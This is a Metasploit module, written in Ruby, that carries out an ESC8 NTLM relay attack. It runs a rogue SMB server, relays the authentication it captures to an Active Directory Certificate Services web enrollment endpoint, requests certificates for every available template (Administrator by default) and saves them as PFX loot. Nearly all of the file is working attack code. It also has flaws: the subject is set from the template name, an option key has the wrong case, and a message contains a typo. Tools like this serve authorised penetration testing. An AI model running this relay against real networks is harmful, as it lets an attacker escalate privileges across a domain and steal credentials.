##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HttpRelay

  def initialize
    super({
      'Name' => 'ESC8 Relay: SMB',
      'Description' => %q{
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7' # query for available certs
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
        OptString.new('ALT_USER', [ true, 'The user to issue the certificate for.', 'ADMINISTRATOR' ]),
        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  def start_service(opts = {})
    ntlm_provider = HTTPRelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider
    super(opts)
  end

  def on_client_connect(_client)
    @login_uri = "#{datastore['CERT_URI']}/csertfnsh.asp"
    print_good('Received SMB connection on Auth Capture Server!')
  end

  alias run exploit

  def create_csr(private_key, alt_usr)
    vprint_status('Generating CSR...')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', alt_usr, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    vprint_status('CSR Generated')
    return request
  rescue Exception => e
    print_error(e.to_s)
    elog("Error creating certificate request:\n #{e}")
    raise e
    return nil
  end

  def post_login_action(client_socket, _opts = {})
    print_status('Querying certificate templates; this may take some time')
    cert_list = get_cert_list(client_socket)
    return false if cert_list.nil?

    print_status('Available Certificates:')
    cert_list.each do |cert_entry|
      print_status(cert_entry)
    end

    if cert_list.include?(datastore['CERT_TEMPLATE'])
      retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], datastore['alt_user'])
    else
      print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
      print_status('Attempting to generate certificates for all templates')
      cert_list.each do |cert_entry|
        retrieve_cert(client_socket, cert_entry, datastore['alt_user'])
      end
    end
    return true
  end

  def get_cert_list(client_socket)
    req = client_socket.request_raw(
      {
        'method' => 'GET',
        'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
      }
    )
    res = client_socket._send_recv(req, 20, true)
    raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
    user_list = []
    raw_list.each do |element|
      user_list.append(element[0])
    end
    return user_list
  rescue Exception => e
    print_error(e.to_s)
    elog("Error requesting certificate template list:\n #{e}")
    raise e
    return nil
  end

  def retrieve_cert(client_socket, cert_template, alt_user)
    vprint_status("Sending Post to generate certificate for #{alt_user} using the #{cert_template} template")
    begin
      private_key = OpenSSL::PKey::RSA.new(4096)
      request = create_csr(private_key, cert_template)
      cert_template_string = "CertificateTemplate:#{cert_template}"
      req = client_socket.request_cgi(
        {
          'method' => 'POST',
          'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
          'ctype' => 'application/x-www-form-urlencoded',
          'vars_post' => {
            'Mode' => 'newreq',
            'CertRequest' => request.to_s,
            'CertAttrib' => cert_template_string,
            'TargetStoreFlags' => 0,
            'SaveCert' => 'yes',
            'ThumbPrint' => ''
          }
        }
      )
      res = client_socket._send_recv(req, 20, true)
      vprint_status('Post Sent')
      if res&.code == 200 && !res.body.include?('request was denied')
        print_good("Certificate Request Granted using template #{cert_template} and uer #{alt_user}")
      else
        print_bad("Certificate Request Denied using template #{cert_template} and uer #{alt_user}")
        return false
      end
    rescue Exception => e
      print_error(e.to_s)
      elog("Error sending POST request to generate Certificate: #{e}")
      raise e
      return nil
    end
    begin
      location_tag = res.body.match(/^.*location="(.*)"/)[1]
      vprint_status("Certificate location tag = #{location_tag}")
      location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
      vprint_status('Requesting Certificate from Relay Target...')
      req = client_socket.request_cgi(
        {
          'method' => 'GET',
          'uri' => location_uri
        }
      )
      res = client_socket._send_recv(req, 20, true)
      info = nil
      certificate = OpenSSL::X509::Certificate.new(res.body)
      pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
      stored_path = store_loot('windows.ad.cs',
                               'application/x-pkcs12',
                               rhost,
                               pkcs12.to_der,
                               'certificate.pfx',
                               info)
      print_status("Certificate saved to #{stored_path}")
    rescue Exception => e
      print_error(e.to_s)
      elog("Error getting certificate:\n #{e}")
      raise e
      return nil
    end
    return certificate
  end

end
